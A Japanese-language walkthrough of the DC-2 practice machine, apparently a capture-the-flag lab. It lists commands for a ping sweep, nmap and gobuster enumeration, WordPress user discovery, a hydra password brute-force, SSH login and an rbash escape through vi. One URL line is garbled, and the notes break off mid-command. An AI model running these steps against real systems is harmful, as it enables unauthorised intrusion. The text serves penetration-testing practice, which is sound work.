1.ParrotのIPアドレスを調べる
```bash
ip -4 addr show dev enq0s3
```
- -4 : IPv4に絞る
- addr show : ネットワークインターフェイスの状態を表示
-  dev ネットワークインターフェイスを指定
2.DC-2マシンのIPアドレスを特定する
```bash
for ip in $(seq 1 254); do (ping -c 1 192.168.56.$ip 2> /dev/null | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &); done
```
- ping -c 1 192.168.56.$ip : 疎通確認
- grep "64 bytes" : 「64bytes」を含む
- cut -d " " -f 4 : 空白で区切り、４番目の文字列を抽出
- tr -d ":" :  「:」を削除
3.ポートスキャンする
```bash
nmap -sC -sV $IP --open -p-
```
- port 7744 : SSHサービス。認証情報があればSSHサービスにアクセス可能
4.HTTPアクセスする
- 現段階でのアクセスは不可
## /etc/hostsファイルに追記
### sudo vi /etc/hosts
```
192.168.56.106 dc-2
```
- 必要に応じてコメントアウト
5.curlコマンドでリダイレクトページを扱う
```bash
curl -l http://dc-2/
```
6.URLを環境変数に設定する
```bash
export URL="htp://[:]80$IP/"
```
7.アクセスできるファイルを列挙
```bash
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
```
8.見つけたファイルにHTTPアクセスする
```
http://dc-2/wp-admin
```
9.Wigをつかって情報収集
```bash
wig $URL
```
- wordpressのバージョンの絞り込みは成功
10.ユーザー列挙
  - http://dc-2/?author=1　⇒　adminに転送
  - http://dc-2/?author=3　⇒　jerryに転送
  **さらにユーザーを探す**
```bash
nmap -p80 --script http-wordpress-users $IP
```
**Tomを発見**
11.辞書ファイルを生成
```bash
cewl dc-2
```
12.wordpressの認証を解読
**user.txtとcewl.txtを作成**
```bash
hydra -L users.txt -P cewl.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
13.SSHにアクセスする
```bash
ssh jerry@$IP -p 7744
```
**入れず**
```bash
ssh Tom@$IP -p 7744
```
**入れる**
14.Tomがアクセスできたので実行可能なコマンドを調べる
*以下、tom@DC-2*
```bash
echo $SHELL
# /bin/rbash
```
**rbashの特徴**
- 環境変数PATHが読み取り専用
- フルパスでコマンドが実行不可
- リダイレクトできない
- 機能制限モードを解除できない
**結果**
- あらゆるコマンドが使用不可
15.基本コマンドが実行できる環境を目指す
### vi
```bash
:set shell=/bin/sh
:shell
```
```
echo $SHELL
# /bin/rbash
```
```
echo $0
# /bin/sh
```
*shになってる*
### 環境変数PATHを設定する
```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
```
cat 

